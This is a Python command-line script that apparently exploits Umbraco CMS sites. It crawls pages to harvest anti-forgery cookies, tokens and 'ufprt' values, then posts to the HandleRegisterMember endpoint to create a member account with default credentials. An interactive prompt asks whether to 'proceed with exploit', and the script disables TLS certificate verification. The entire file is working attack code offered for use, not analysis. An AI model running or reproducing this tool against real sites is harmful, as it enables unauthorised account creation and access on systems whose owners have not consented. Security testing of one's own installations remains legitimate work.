import argparse
import html.parser
import http.cookies
import pprint
import ssl
import urllib.error
import urllib.parse
import urllib.request


def parse_args():
    """Parse the command line arguments passed to the script."""
    parser = argparse.ArgumentParser(
        description="Attempt to create an member account on an Umbraco site using the public `HandleRegisterMember` endpoint.",
        epilog="Note that it is necessary to crawl for the anti-forgery tokens in Umbraco versions 7.13 and up.")
    parser.add_argument("URL",
                        help="the base URL of the Umbraco site")
    parser.add_argument("--crawl", "-C",
                        action="store_true",
                        help="crawl the site to find an anti-forgery cookie, token, and ufprt to send with the request")
    parser.add_argument("--name", "-n",
                        default="Neo",
                        help="the new member's name")
    parser.add_argument("--email", "-e",
                        default="neo@matrix.com",
                        help="the new member's email address")
    parser.add_argument("--username", "-u",
                        default="N30",
                        help="the new member's username")
    parser.add_argument("--password", "-p",
                        default="Umbraco12345!",
                        help="the new member's password")
    parser.add_argument("--type", "-t",
                        help="the member type alias")
    return parser.parse_args()


def register_member(base_url,
                    name="Neo",
                    email="neo@matrix.com",
                    username="N30",
                    password="Umbraco12345!",
                    member_type_alias=None,
                    forgery_cookie=None,
                    forgery_token=None,
                    ufprt=None):
    """Attempt to register a member using the auto-routed HandleRegisterMember method."""

    register_url = urllib.parse.urljoin(
        base_url, "/Umbraco/Surface/UmbRegister/HandleRegisterMember")

    form_data = {
        "registerModel.Name": name,
        "registerModel.Email": email,
        "registerModel.Username": username,
        "registerModel.Password": password
    }

    if member_type_alias is not None:
        form_data["registerModel.MemberTypeAlias"] = member_type_alias

    if forgery_token is not None:
        form_data["__RequestVerificationToken"] = forgery_token

    if ufprt is not None:
        form_data["ufprt"] = ufprt

    post_data = urllib.parse.urlencode(form_data).encode("ascii")

    print("Request URL: " + register_url)
    print("Parameters:")
    pprint.PrettyPrinter().pprint(form_data)

    url_opener = get_url_opener()

    if forgery_cookie is not None:
        url_opener.addheaders.append(
            ("Cookie", "__RequestVerificationToken=" + forgery_cookie))

    try:
        with url_opener.open(register_url, post_data) as response:
            print(response)
    except urllib.error.HTTPError as error:
        print(error)


def crawl(base_url, urls=["/"], urls_crawled=[]):
    """Crawl a site to obtain the anti-forgery cookie, token, and ufprt."""
    urls_to_crawl = list(set(urls) - set(urls_crawled))
    if (len(urls_to_crawl) == 0):
        return None, None, None

    for url in urls_to_crawl:
        full_url = urllib.parse.urljoin(base_url, url)
        print("Crawling URL: " + full_url)
        forgery_cookie, forgery_token, ufprt, links = parse_page(full_url)

        if forgery_cookie is None:
            print("- Anti-forgery cookie not present. Continuing to crawl...")
            continue_crawling = True
        else:
            print("- Found anti-forgery cookie.")
            if forgery_token is None:
                print("- Anti-forgery token not present. Continuing to crawl...")
            elif ufprt is None:
                print(
                    "- Found anti-forgery token but not ufprt. This may be enough in certain situations.")
                continue_crawling = input(
                    "- Stop crawling and proceed with exploit? [Y/N] ") == "N"
            else:
                print(
                    "- Found anti-forgery token and ufprt. This should be everything we need.")
                continue_crawling = input(
                    "- Stop crawling and proceed with exploit? [Y/N] ") == "N"

        if continue_crawling:
            urls_crawled.append(url)
            return crawl(base_url, links, urls_crawled)

        return forgery_cookie, forgery_token, ufprt


def parse_page(url):
    """Parse a web page to obtain the anti-forgery cookie, token, and ufprt fields."""
    url_opener = get_url_opener()

    with url_opener.open(url) as response:
        html = response.read().decode("utf-8")

        parser = HTMLParser()
        parser.feed(html)

        cookie_header = response.info().get("Set-Cookie")
        simple_cookie = http.cookies.SimpleCookie(cookie_header)

        if "__RequestVerificationToken" in simple_cookie:
            forgery_cookie = simple_cookie["__RequestVerificationToken"].value
        else:
            forgery_cookie = None

        return forgery_cookie, parser.forgery_token, parser.ufprt, parser.links


def get_url_opener():
    """Build a URL opener that won't complain about self-signed certificates."""
    context = ssl.SSLContext()
    context.verify_mode = ssl.CERT_NONE
    https_handler = urllib.request.HTTPSHandler(context=context)
    return urllib.request.build_opener(https_handler)


class HTMLParser(html.parser.HTMLParser):
    """Parser that extracts the local links, anti-forgery token, and ufprt from a page."""

    def __init__(self):
        html.parser.HTMLParser.__init__(self)
        self.links = []
        self.forgery_token = None
        self.ufprt = None

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            href = self.get_attr_value(attrs, "href")
            if href is not None and href.startswith("/"):
                self.links.append(href)
        elif tag == "input":
            name = self.get_attr_value(attrs, "name")
            value = self.get_attr_value(attrs, "value")
            if name is not None and value is not None:
                if name == "__RequestVerificationToken":
                    self.forgery_token = value
                if name == "ufprt":
                    self.ufprt = value

    def get_attr_value(self, attrs, attr_name):
        attr = next((x for x in attrs if x[0] == attr_name), None)
        if attr is not None:
            return attr[1]
        return None


if __name__ == "__main__":
    args = parse_args()
    forgery_cookie, forgery_token, ufprt = None, None, None

    if (args.crawl):
        forgery_cookie, forgery_token, ufprt = crawl(args.URL)

    register_member(args.URL,
                    args.name,
                    args.email,
                    args.username,
                    args.password,
                    args.type,
                    forgery_cookie,
                    forgery_token,
                    ufprt)
